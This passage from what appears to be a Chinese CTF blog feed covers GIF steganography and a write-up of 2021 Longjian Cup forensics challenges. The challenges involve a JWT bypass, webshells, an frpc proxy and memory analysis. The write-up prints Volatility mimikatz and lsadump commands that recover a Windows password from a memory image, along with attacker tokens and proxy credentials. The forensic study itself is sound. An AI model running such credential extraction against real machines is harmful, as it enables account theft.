plug-ins system.</p></blockquote><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><h2 id="文件结构-1"><a href="#文件结构-1" class="headerlink" title="文件结构"></a>文件结构</h2><p>一个GIF文件的结构可分为</p><ul><li>文件头（File Header）<ul><li>GIF 文件署名（Signature）</li><li>版本号（Version）</li></ul></li><li>GIF 数据流（GIF Data Stream）<ul><li>控制标识符</li><li>图象块（Image Block）</li><li>其他的一些扩展块</li></ul></li><li>文件终结器（Trailer）</li></ul><p>下表显示了一个 GIF 文件的组成结构：</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/gif.png" alt="gif"></p><p>中间的那个大块可以被重复任意次</p><h3 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h3><p>GIF 署名（Signature）和版本号（Version）。GIF 署名用来确认一个文件是否是 GIF 格式的文件，这一部分由三个字符组成：<code>GIF</code>；文件版本号也是由三个字节组成，可以为 <code>87a</code> 或 <code>89a</code>。</p><h3 id="逻辑屏幕标识符（Logical-Screen-Descriptor）"><a href="#逻辑屏幕标识符（Logical-Screen-Descriptor）" class="headerlink" title="逻辑屏幕标识符（Logical Screen Descriptor）"></a>逻辑屏幕标识符（Logical Screen Descriptor）</h3><p>Logical Screen Descriptor（逻辑屏幕描述符）紧跟在 header 后面。这个块告诉 decoder（解码器）图片需要占用的空间。它的大小固定为 7 个字节，以 canvas width（画布宽度）和 canvas height（画布高度）开始。</p><h3 id="全局颜色列表（Global-Color-Table）"><a href="#全局颜色列表（Global-Color-Table）" class="headerlink" title="全局颜色列表（Global Color Table）"></a>全局颜色列表（Global Color Table）</h3><p>GIF格式可以拥有global color table，或用于针对每个子图片集，提供local color table。每个color<br>table由一个RGB（就像通常我们见到的（255，0，0）红色 那种）列表组成。</p><h3 id="图像标识符（Image-Descriptor）"><a href="#图像标识符（Image-Descriptor）" class="headerlink" title="图像标识符（Image Descriptor）"></a>图像标识符（Image Descriptor）</h3><p>一个 GIF 文件一般包含多个图片。之前的图片渲染模式一般是将多个图片绘制到一个大的（virtual<br>canvas）虚拟画布上，而现在一般将这些图片集用于实现动画。</p><p>每个 image 都以一个 image descriptor block（图像描述块）作为开头，这个块固定为 10 字节。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/imagesdescription.png" alt="imagesdescription"></p><h3 id="图像数据（Image-Data）"><a href="#图像数据（Image-Data）" class="headerlink" title="图像数据（Image Data）"></a>图像数据（Image Data）</h3><p>终于到了图片数据实际存储的地方。Image Data是由一系列的输出编码（output codes）构成，它们告诉decoder（解码器）需要绘制在画布上的每个颜色信息。这些编码以字节码的形式组织在这个块中。</p><h3 id="文件终结器（Trailer）"><a href="#文件终结器（Trailer）" class="headerlink" title="文件终结器（Trailer）"></a>文件终结器（Trailer）</h3><p>该块为一个单字段块，用来指示该数据流的结束。取固定值0x3b.</p><p>更多参见 <a href="http://www.jianshu.com/p/df52f1511cf8">gif 格式图片详细解析</a></p><h2 id="空间轴"><a href="#空间轴" class="headerlink" title="空间轴"></a>空间轴</h2><p>由于GIF的动态特性，由一帧帧的图片构成，所以每一帧的图片，多帧图片间的结合，都成了隐藏信息的一种载体。</p><p>对于需要分离的GIF文件,可以使用<code>convert</code>命令将其每一帧分割开来</p><pre class="language-bash" data-language="bash"><code class="language-bash">convert cake.gif cake.png<span class="token function">ls</span>cake-0.png cake-1.png cake-2.png cake-3.png cake.gif</code></pre><h3 id="例题-cake"><a href="#例题-cake" class="headerlink" title="例题-cake"></a>例题-cake</h3><blockquote><p>WDCTF-2017:3-2</p></blockquote><p>打开gif后，思路很清晰，分离每一帧图片后，将起合并得到完整的二维码即可</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210928103111.png" alt="20210928103111"></p><p>扫码后得到一串16进制字符串</p><p><code>03f30d0ab8c1aa5....74080006030908</code></p><p>开头<code>03f3</code>为<code>pyc</code>文件的头，恢复为<code>python</code>脚本后直接运行得到flag</p><p>反编译网站：<a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p><h2 id="时间轴"><a href="#时间轴" class="headerlink" title="时间轴"></a>时间轴</h2><p>GIF文件每一帧间的时间间隔也可以作为信息隐藏的载体。</p><p>例如在当时在XMan选拔赛出的一题</p><h3 id="例题-XMAN-2017-100-gif"><a href="#例题-XMAN-2017-100-gif" class="headerlink" title="例题-XMAN-2017:100.gif"></a>例题-XMAN-2017:100.gif</h3><p>打开发现gif文件损坏，用010editor打开，发现缺少了文件头</p><p>通过<code>identify</code>命令清晰的打印出每一帧的时间间隔</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ identify <span class="token parameter variable">-format</span> <span class="token string">"%s %T <span class="token entity" title="\n">\n</span>"</span> <span class="token number">100</span>.gif<span class="token number">0</span> <span class="token number">66</span><span class="token number">1</span> <span class="token number">66</span><span class="token number">2</span> <span class="token number">20</span><span class="token number">3</span> <span class="token number">10</span><span class="token number">4</span> <span class="token number">20</span><span class="token number">5</span> <span class="token number">10</span><span class="token number">6</span> <span class="token number">10</span><span class="token number">7</span> <span class="token number">20</span><span class="token number">8</span> <span class="token number">20</span><span class="token number">9</span> <span class="token number">20</span><span class="token number">10</span> <span class="token number">20</span><span class="token number">11</span> <span class="token number">10</span><span class="token number">12</span> <span class="token number">20</span><span class="token number">13</span> <span class="token number">20</span><span class="token number">14</span> <span class="token number">10</span><span class="token number">15</span> <span class="token number">10</span></code></pre><p>推断 <code>20 &amp; 10</code>  分别代表 <code>0 &amp; 1</code>，提取每一帧间隔并进行转化。</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> flag<span class="token operator">|</span><span class="token function">cut</span> <span class="token parameter variable">-d</span> <span class="token string">' '</span> <span class="token parameter variable">-f</span> <span class="token number">2</span><span class="token operator">|</span><span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">'66'</span><span class="token operator">|</span><span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">'\n'</span><span class="token operator">|</span><span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">'0'</span><span class="token operator">|</span><span class="token function">tr</span> <span class="token string">'2'</span> <span class="token string">'0'</span><span class="token comment">#查看flag文件，以空格为分隔符，显示第二部分，删除66，删除换行，删除0，把2转换为0</span>0101100001001101010000010100111001111011001110010011011000110101001101110011010101100010011001010110010101100100001101000110010001100101011000010011000100111000011001000110010101100100001101000011011100110011001101010011011000110100001100110110000101100101011000110110011001100001001100110011010101111101<span class="token comment">#</span></code></pre><p>最后转 ASCII 码得到 flag。</p><h2 id="隐写软件-1"><a href="#隐写软件-1" class="headerlink" title="隐写软件"></a>隐写软件</h2><ul><li><a href="https://github.com/matthewgao/F5-steganography">F5-steganography</a></li></ul><h2 id="条形码"><a href="#条形码" class="headerlink" title="条形码"></a>条形码</h2><ul><li>宽度不等的多个黑条和空白，按照一定的编码规则排列，用以表达一组信息的图形标识符</li><li>国际标准</li><li>EAN-13 商品标准，13 位数字</li><li>Code-39：39 字符</li><li>Code-128：128 字符</li><li><a href="https://online-barcode-reader.inliteresearch.com/">条形码在线识别</a></li></ul><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><ul><li><p>用某种特定几何图形按一定规律在平面分步的黑白相间的图形记录数据符号信息</p></li><li><p>堆叠式 &#x2F; 行排式二维码：Code 16 k、Code 49、PDF417</p></li><li><p>矩阵式二维码：QR CODE</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/![](.figureqr1.jpg).jpg" alt="![](.figureqr1.jpg)"></p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/![](.figureqr2.jpg).jpg" alt="![](.figureqr2.jpg)"></p></li></ul><ul><li>参考链接：<a href="https://ctf-wiki.org/misc/picture/introduction/">https://ctf-wiki.org/misc/picture/introduction/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年陇剑杯线上赛</title>
      <link href="/ctf/competition/2021longjiancup/"/>
      <url>/ctf/competition/2021longjiancup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面<br>这次的比赛真不愧是对口举办的比赛，基本上就是电子取证的方向，可以说是学到了一些东西</p></blockquote><h2 id="01-签到"><a href="#01-签到" class="headerlink" title="01 签到"></a>01 签到</h2><h3 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h3><p>网管小王在上网途中发现自己的网络访问异常缓慢，于是对网络出口捕获了流量，请您分析流量后进行回答：（本题仅1小问）</p><p>此时正在进行的可能是_____<code>http</code>_____协议的网络攻击。（如有字母请全部使用小写，填写样例：http、dns、ftp）</p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>打开流量文件，发现大量403，于是获取题目答案<code>http</code><br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210922170316.png" alt="20210922170316"></p><h2 id="02-JWT"><a href="#02-JWT" class="headerlink" title="02 JWT"></a>02 JWT</h2><blockquote><p>昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答</p></blockquote><h3 id="2-1-题目内容"><a href="#2-1-题目内容" class="headerlink" title="2.1 题目内容"></a>2.1 题目内容</h3><p>该网站使用了__<code>jwt</code>____ 认证方式。</p><h3 id="2-2-题目内容"><a href="#2-2-题目内容" class="headerlink" title="2.2 题目内容"></a>2.2 题目内容</h3><p>黑客绕过验证使用的jwt中，id和username是__<code>10087#admin</code>____ 。（中间使用#号隔开，例如1#admin）</p><h4 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h4><p>获取可执行命令的jwt：<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAwODcsIk1hcENsYWltcyI6eyJ1c2VybmFtZSI6ImFkbWluIn19.rurQD5RYgMrFZow8r-k7KCP13P32sF-RpTXhKsxzvD0</code><br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210922171714.png" alt="20210922171714"><br>解码获取id和username：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>01签到<span class="token punctuation">]</span> basecrack <span class="token parameter variable">-b</span> <span class="token string">'eyJpZCI6MTAwODcsIk1hcENsYWltcyI6eyJ1c2VybmFtZSI6ImFkbWluIn19'</span>python basecrack.py <span class="token parameter variable">-h</span> <span class="token punctuation">[</span>FOR HELP<span class="token punctuation">]</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> Encoded Base: eyJpZCI6MTAwODcsIk1hcENsYWltcyI6eyJ1c2VybmFtZSI6ImFkbWluIn19<span class="token punctuation">[</span><span class="token operator">></span><span class="token punctuation">]</span> Decoding as Base64: <span class="token punctuation">&#123;</span><span class="token string">"id"</span>:10087,<span class="token string">"MapClaims"</span>:<span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token builtin class-name">:</span><span class="token string">"admin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> The Encoding Scheme Is Base64</code></pre><h3 id="2-3-题目内容"><a href="#2-3-题目内容" class="headerlink" title="2.3 题目内容"></a>2.3 题目内容</h3><p>黑客获取webshell之后，权限是__<code>root</code>____ ？<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210922172216.png" alt="20210922172216"></p><h3 id="2-4-题目内容"><a href="#2-4-题目内容" class="headerlink" title="2.4 题目内容"></a>2.4 题目内容</h3><p>黑客上传的恶意文件文件名是____<code>1.c</code>_________。(请提交带有文件后缀的文件名，例如x.txt)</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210922174005.png" alt="20210922174005"></p><h3 id="2-5-题目内容"><a href="#2-5-题目内容" class="headerlink" title="2.5 题目内容"></a>2.5 题目内容</h3><p>黑客在服务器上编译的恶意so文件，文件名是_____<code>looter.so</code>________。(请提交带有文件后缀的文件名，例如x.so) </p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923094304.png" alt="20210923094304"></p><h3 id="2-6-题目内容"><a href="#2-6-题目内容" class="headerlink" title="2.6 题目内容"></a>2.6 题目内容</h3><p>黑客在服务器上修改了一个配置文件，文件的绝对路径为______<code>/etc/pam.d/common-auth</code>_______。（请确认绝对路径后再提交）<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923094335.png" alt="20210923094335"></p><h2 id="03-webshell"><a href="#03-webshell" class="headerlink" title="03 webshell"></a>03 webshell</h2><blockquote><p>单位网站被黑客挂马，请您从流量中分析出webshell，进行回答</p></blockquote><h3 id="3-1-题目内容"><a href="#3-1-题目内容" class="headerlink" title="3.1 题目内容"></a>3.1 题目内容</h3><p>黑客登录系统使用的密码是_____<code>Admin123！@#</code>____ ____。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923094751.png" alt="20210923094751"></p><h3 id="3-2-题目内容"><a href="#3-2-题目内容" class="headerlink" title="3.2 题目内容"></a>3.2 题目内容</h3><p>黑客修改了一个日志文件，文件的绝对路径为_____ <code>/var/www/html/data/Runtime/Logs/Home/21_08_07.log</code>__ ______。（请确认绝对路径后再提交）</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923095057.png" alt="20210923095057"></p><h3 id="3-3-题目内容"><a href="#3-3-题目内容" class="headerlink" title="3.3 题目内容"></a>3.3 题目内容</h3><p>黑客获取webshell之后，权限是__ <code>www-data</code>__ __？<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923095220.png" alt="20210923095220"></p><h3 id="3-4-题目内容"><a href="#3-4-题目内容" class="headerlink" title="3.4 题目内容"></a>3.4 题目内容</h3><p>黑客写入的webshell文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923100157.png" alt="20210923100157"></p><h3 id="3-5-题目内容"><a href="#3-5-题目内容" class="headerlink" title="3.5 题目内容"></a>3.5 题目内容</h3><p>黑客上传的代理工具客户端名字是____ <code>frpc</code>_________。（如有字母请全部使用小写） </p><h3 id="3-6-3-7-题目内容"><a href="#3-6-3-7-题目内容" class="headerlink" title="3.6&amp;3.7 题目内容"></a>3.6&amp;3.7 题目内容</h3><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923100422.png" alt="20210923100422"></p><blockquote><p>这里注意观察数据包，可以发现在这条注入以后，目录文件多了一个frpc.ini，因此解码即可获取答案</p></blockquote><p>3.6 黑客代理工具的回连服务端IP是____ <code>192.168.239.123</code>_________。</p><p>3.7 黑客的socks5的连接账号、密码是__ <code>0HDFt16cLQJ#JTN276Gp</code>____。（中间使用#号隔开，例如admin#passwd）</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923100726.png" alt="20210923100726"></p><h2 id="04-日志分析"><a href="#04-日志分析" class="headerlink" title="04 日志分析"></a>04 日志分析</h2><blockquote><p>单位某应用程序被攻击，请分析日志，进行作答：</p></blockquote><h3 id="4-1-题目内容"><a href="#4-1-题目内容" class="headerlink" title="4.1 题目内容"></a>4.1 题目内容</h3><p>网络存在源码泄漏，源码文件名是____ <code>www.zip</code>_________。(请提交带有文件后缀的文件名，例如x.txt)<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923101402.png" alt="20210923101402"></p><h3 id="4-2-题目内容"><a href="#4-2-题目内容" class="headerlink" title="4.2 题目内容"></a>4.2 题目内容</h3><p>分析攻击流量，黑客往&#x2F;tmp目录写入一个文件，文件名为______ <code>sess_car</code>_______。</p><h3 id="4-3-题目内容"><a href="#4-3-题目内容" class="headerlink" title="4.3 题目内容"></a>4.3 题目内容</h3><p>分析攻击流量，黑客使用的是___ <code>SplFileObject</code>___类读取了秘密文件。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923101536.png" alt="20210923101536"></p><h2 id="05-流量分析"><a href="#05-流量分析" class="headerlink" title="05 流量分析"></a>05 流量分析</h2><blockquote><p>某天晚上，X单位的网站被黑客入侵了，管理员从单位网络出口捕获采样流量，请您分析流量进行回答<br>这道题只是做个记录，暂时还搞不清远离，参考 <a href="https://blog.csdn.net/qq_40568770/article/details/120311122">YYK大佬的文章</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210923135705.png" alt="20210923135705"></p><h3 id="5-1-题目内容"><a href="#5-1-题目内容" class="headerlink" title="5.1 题目内容"></a>5.1 题目内容</h3><p>攻击者的IP是____ <code>172.18.0.125</code>_________。</p><h3 id="5-2-题目内容"><a href="#5-2-题目内容" class="headerlink" title="5.2 题目内容"></a>5.2 题目内容</h3><p>攻击者所使用的会话密钥是______ <code>DtX0GScM9dwrgZht</code>_______。</p><h3 id="5-3-题目内容"><a href="#5-3-题目内容" class="headerlink" title="5.3 题目内容"></a>5.3 题目内容</h3><p>攻击者所控制的C&amp;C服务器IP是____ <code>147.182.251.98</code>_________。</p><h2 id="06-内存分析"><a href="#06-内存分析" class="headerlink" title="06 内存分析"></a>06 内存分析</h2><blockquote><p>网管小王制作了一个虚拟机文件，让您来分析后作答：</p></blockquote><h3 id="6-1-题目内容"><a href="#6-1-题目内容" class="headerlink" title="6.1 题目内容"></a>6.1 题目内容</h3><p>虚拟机的密码是____ <code>flag&#123;W31C0M3 T0 THiS 34SY F0R3NSiCX&#125;</code>_________。（密码中为flag{xxxx}，含有空格，提交时不要去掉）</p><h4 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h4><p>这里可以使用工具自带的lsadump也可以安装mimikatz插件获取</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>06内存分析<span class="token punctuation">]</span> volatility <span class="token parameter variable">-f</span> Target.vmem  <span class="token parameter variable">--profile</span><span class="token operator">=</span>Win7SP1x64 mimikatzVolatility Foundation Volatility Framework <span class="token number">2.6</span>.1Module   User             Domain           Password-------- ---------------- ---------------- ----------------------------------------wdigest  CTF              WIN-QUN5RVOOF27  flag<span class="token punctuation">&#123;</span>W31C0M3 T0 THiS 34SY F0R3NSiCX<span class="token punctuation">&#125;</span>wdigest  WIN-QUN5RVOOF27$ WORKGROUP<span class="token punctuation">[</span>06内存分析<span class="token punctuation">]</span> volatility <span class="token parameter variable">-f</span> Target.vmem  <span class="token parameter variable">--profile</span><span class="token operator">=</span>Win7SP1x64 lsadumpVolatility Foundation Volatility Framework <span class="token number">2.6</span>.1DefaultPassword0x00000000  <span class="token number">48</span> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   H<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.0x00000010  <span class="token number">66</span> 00 6c 00 <span class="token number">61</span> 00 <span class="token number">67</span> 00 7b 00 <span class="token number">57</span> 00 <span class="token number">33</span> 00 <span class="token number">31</span> 00   f.l.a.g.<span class="token punctuation">&#123;</span>.W.3.1.0x00000020  <span class="token number">43</span> 00 <span class="token number">30</span> 00 4d 00 <span class="token number">33</span> 00 <span class="token number">20</span> 00 <span class="token number">54</span> 00 <span class="token number">30</span> 00 <span class="token number">20</span> 00   C.0.M.3<span class="token punctuation">..</span>.T.0<span class="token punctuation">..</span>.0x00000030  <span class="token number">54</span> 00 <span class="token number">48</span> 00 <span class="token number">69</span> 00 <span class="token number">53</span> 00 <span class="token number">20</span> 00 <span class="token number">33</span> 00 <span class="token number">34</span> 00 <span class="token number">53</span> 00   T.H.i.S<span class="token punctuation">..</span>.3.4.S.0x00000040  <span class="token number">59</span> 00 <span class="token number">20</span> 00 <span class="token number">46</span> 00 <span class="token number">30</span> 00 <span class="token number">52</span> 00 <span class="token number">33</span> 00 4e 00 <span class="token number">53</span> 00   Y<span class="token punctuation">..</span>.F.0.R.3.N.S.0x00000050  <span class="token number">69</span> 00 <span class="token number">43</span> 00 <span class="token number">58</span> 00 7d 00 00 00 00 00 00 00 00 00   i.C.X.<span class="token punctuation">&#125;</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.DPAPI_SYSTEM0x00000000  2c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ,<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.0x00000010  01 00 00 00 <span class="token number">49</span> 06 <span class="token number">16</span> <span class="token number">35</span> a7 <span class="token number">90</span> b6 2a <span class="token number">53</span> <span class="token number">69</span> 03 <span class="token number">27</span>   <span class="token punctuation">..</span><span class="token punctuation">..</span>I<span class="token punctuation">..</span><span class="token number">5</span><span class="token punctuation">..</span>.*Si.'0x00000020  b9 9a <span class="token number">60</span> 9e 9a <span class="token number">15</span> <span class="token number">90</span> <span class="token number">37</span> 7c cf 1d 3c f1 3f <span class="token number">60</span> 05   <span class="token punctuation">..</span><span class="token variable"><span class="token variable">`</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token number">7</span><span class="token operator">|</span><span class="token punctuation">..</span><span class="token operator">&lt;</span>.?<span class="token variable">`</span></span><span class="token builtin class-name">.</span>0x00000030  <span class="token number">56</span> c1 <span class="token number">59</span> <span class="token number">68</span> <span class="token number">53</span> 9a <span class="token function">dc</span> e0 <span class="token number">18</span> b3 <span class="token number">55</span> ef 00 00 00 00   V.YhS<span class="token punctuation">..</span><span class="token punctuation">..</span>.U<span class="token punctuation">..</span><span class="token punctuation">..</span>.</code></pre><h3 id="6-2-题目内容"><a href="#6-2-题目内容" class="headerlink" title="6.2 题目内容"></a>6.2 题目内容</h3><p>虚拟机中有一个某品牌手机的备份文件，文件里的图片里的字符串为______ <code>flag&#123;TH4NK Y0U FOR DECRYPTING MY DATA&#125;</code>_______。（解题过程中需要用到上一题答案中flag{}内的内容进行处理。本题的格式也是flag{xxx}，含有空格，提交时不要去掉）</p><h4 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h4><pre class="language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> Target.vmem  <span class="token parameter variable">--profile</span><span class="token operator">=</span>Win7SP1x64 filescan <span class="token operator">|</span><span class="token function">grep</span> CTFVolatility Foundation Volatility Framework <span class="token number">2.6</span>.1<span class="token punctuation">..</span>.0x000000007fc68a10     <span class="token number">16</span>      <span class="token number">0</span> -W-r-- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>HUAWEI P40_2021-aa-bb xx.yy.zz<span class="token punctuation">\</span>info.xml0x000000007fd3cf20      <span class="token number">2</span>      <span class="token number">2</span> RW-rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Explorer<span class="token punctuation">\</span>thumbcache_1024.db0x000000007fd3df20      <span class="token number">2</span>      <span class="token number">2</span> RW-rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Explorer<span class="token punctuation">\</span>thumbcache_256.db0x000000007fd3ef20      <span class="token number">2</span>      <span class="token number">2</span> RW-rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Explorer<span class="token punctuation">\</span>thumbcache_96.db0x000000007fdc2700      <span class="token number">2</span>      <span class="token number">2</span> RW-rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Explorer<span class="token punctuation">\</span>thumbcache_sr.db0x000000007fe72070      <span class="token number">1</span>      <span class="token number">1</span> RW-rwd <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Explorer<span class="token punctuation">\</span>thumbcache_idx.db0x000000007fe72430      <span class="token number">2</span>      <span class="token number">0</span> -W-r-- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>HUAWEI P40_2021-aa-bb xx.yy.zz<span class="token punctuation">\</span>picture<span class="token punctuation">\</span>storage<span class="token punctuation">\</span>MediaTar<span class="token punctuation">\</span>images<span class="token punctuation">\</span>images0.tar.enc0x000000007feabbc0     <span class="token number">16</span>      <span class="token number">0</span> -W-r-- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>HUAWEI P40_2021-aa-bb xx.yy.zz<span class="token punctuation">\</span>picture.xml</code></pre><p>这里使用filescan扫描CTF用户的文件，发现了华为P40的备份文件</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> Target.vmem  <span class="token parameter variable">--profile</span><span class="token operator">=</span>Win7SP1x64 filescan <span class="token operator">|</span><span class="token function">grep</span> HUAWEIVolatility Foundation Volatility Framework <span class="token number">2.6</span>.10x000000007d8c7d10      <span class="token number">4</span>      <span class="token number">0</span> R--r-d <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>HUAWEI P40_2021-aa-bb xx.yy.zz.exe0x000000007e164cc0     <span class="token number">12</span>      <span class="token number">0</span> R--r-- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>HUAWEI P40_2021-aa-bb xx.yy.zz.exe0x000000007e1e1ae0     <span class="token number">16</span>      <span class="token number">0</span> R----- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Prefetch<span class="token punctuation">\</span>HUAWEI P40_2021-AA-BB XX.YY.Z-6DC73FF4.pf0x000000007ee4d660      <span class="token number">2</span>      <span class="token number">0</span> -W-r-- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>HUAWEI P40_2021-aa-bb xx.yy.zz<span class="token punctuation">\</span>alarm.db0x000000007fc68a10     <span class="token number">16</span>      <span class="token number">0</span> -W-r-- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>HUAWEI P40_2021-aa-bb xx.yy.zz<span class="token punctuation">\</span>info.xml0x000000007fe72430      <span class="token number">2</span>      <span class="token number">0</span> -W-r-- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>HUAWEI P40_2021-aa-bb xx.yy.zz<span class="token punctuation">\</span>picture<span class="token punctuation">\</span>storage<span class="token punctuation">\</span>MediaTar<span class="token punctuation">\</span>images<span class="token punctuation">\</span>images0.tar.enc0x000000007feabbc0     <span class="token number">16</span>      <span class="token number">0</span> -W-r-- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>CTF<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>HUAWEI P40_2021-aa-bb xx.yy.zz<span class="token punctuation">\</span>picture.xml<span class="token punctuation">[</span>06内存分析<span class="token punctuation">]</span> volatility <span class="token parameter variable">-f</span> Target.vmem  <span class="token parameter variable">--profile</span><span class="token operator">=</span>Win7SP1x64 dumpfiles <span class="token parameter variable">-Q</span> 0x000000007d8c7d10 --dump-dir<span class="token operator">=</span>./Volatility Foundation Volatility Framework <span class="token number">2.6</span>.1ImageSectionObject 0x7d8c7d10   None   <span class="token punctuation">\</span>Device<span 